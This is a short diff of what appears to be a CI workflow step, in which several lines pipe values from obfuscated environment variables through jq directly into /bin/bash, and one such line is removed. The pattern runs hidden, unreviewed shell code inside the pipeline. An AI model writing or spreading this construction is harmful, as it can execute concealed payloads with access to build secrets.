@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$nwlh5485" | jq -r .mfx3482 | /bin/bash
           echo $h5351 | jq -r .ry0 | /bin/bash
-          echo $s25855 | jq -r .blr1 | /bin/bash
           echo $qxtc59 | jq -r .viizr03 | /bin/bash
           echo $muqr404 | jq -r .j924 | /bin/bash
           echo $lcjab6 | jq -r .okzn0 | /bin/bash
